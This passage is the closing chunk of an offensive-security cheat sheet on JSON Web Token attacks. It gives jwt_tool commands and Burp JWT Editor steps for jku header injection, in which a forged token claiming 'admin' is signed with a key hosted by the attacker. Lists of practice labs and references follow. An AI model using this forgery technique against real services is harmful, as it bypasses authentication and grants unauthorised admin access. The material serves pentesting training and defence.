<!-- source: JSON Web Token/README.md | chunk 5/5 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

}
```

**Exploit**:

- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py JWT_HERE -X s
    python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
    ```

- Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    1. Generate a new RSA key and host it
    2. Edit JWT's data
    3. Replace the `kid` header with the one from your JWKS
    4. Add a `jku` header and sign the JWT (`Don't modify header` option should be checked)

**Deconstructed**:

```json
{"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}.
{"login":"admin"}.
[Signed with new Private key; Public key exported]
```

## Labs

- [PortSwigger - JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
- [PortSwigger - JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
- [PortSwigger - JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
- [PortSwigger - JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
- [PortSwigger - JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
- [PortSwigger - JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
- [Root Me - JWT - Introduction](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Introduction)
- [Root Me - JWT - Revoked token](https://www.root-me.org/en/Challenges/Web-Server/JWT-Revoked-token)
- [Root Me - JWT - Weak secret](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
- [Root Me - JWT - Unsecure File Signature](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)
- [Root Me - JWT - Public key](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
- [Root Me - JWT - Header Injection](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
- [Root Me - JWT - Unsecure Key Handling](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)

## References

- [5 Easy Steps to Understanding JSON Web Token - Shaurya Sharma - December 21, 2019](https://web.archive.org/web/20210218162416/https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5)
- [Attacking JWT authentication - Sjoerd Langkemper - September 28, 2016](https://web.archive.org/web/20251102094325/https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
- [Club EH RM 05 - Intro to JSON Web Token Exploitation - Nishacid - February 23, 2023](https://web.archive.org/web/20250914204544/https://www.youtube.com/watch?v=d7wmUz57Nlg)
- [Critical vulnerabilities in JSON Web Token libraries - Tim McLean - March 31, 2015](https://web.archive.org/web/20260207024257/https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [Hacking JSON Web Token (JWT) - pwnzzzz - May 3, 2018](https://web.archive.org/web/20180509012007/https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
- [Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify - February 9, 2017](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
- [Hacking JSON Web Tokens - Vickie Li - October 27, 2019](https://web.archive.org/web/20191028125424/https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
- [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng) - August 27, 2017](https://web.archive.org/web/20240229055017/https://nandynarwhals.org/hitbgsec2017-pasty/)
- [How to Hack a Weak JWT Implementation with a Timing Attack - Tamas Polgar - January 7, 2017](https://web.archive.org/web/20190331200826/https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
- [JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight - April 16, 2020](https://web.archive.org/web/20230104231143/https://insomniasec.com/blog/auth0-jwt-validation-bypass)
- [JSON Web Token Vulnerabilities - 0xn3va - March 27, 2022](https://web.archive.org/web/20260305090633/https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities)
- [JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8, 2017](https://web.archive.org/web/20190405023824/https://trustfoundry.net/jwt-hacking-101/)
- [Learn how to use JSON Web Tokens (JWT) for Authentication - dwyl - May 3, 2022](https://github.com/dwyl/learn-json-web-tokens)
- [Privilege Escalation like a Boss - janijay007 - October 27, 2018](https://web.archive.org/web/20190723093831/https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
- [Simple JWT hacking - Hari Prasanth (@b1ack_h00d) - March 7, 2019](https://web.archive.org/web/20200724145838/https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
- [WebSec CTF - Authorization Token - JWT Challenge - Kris Hunt - August 7, 2016](https://web.archive.org/web/20211025223311/https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
- [Write up – JRR Token – LeHack 2019 - Laphaze - July 7, 2019](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
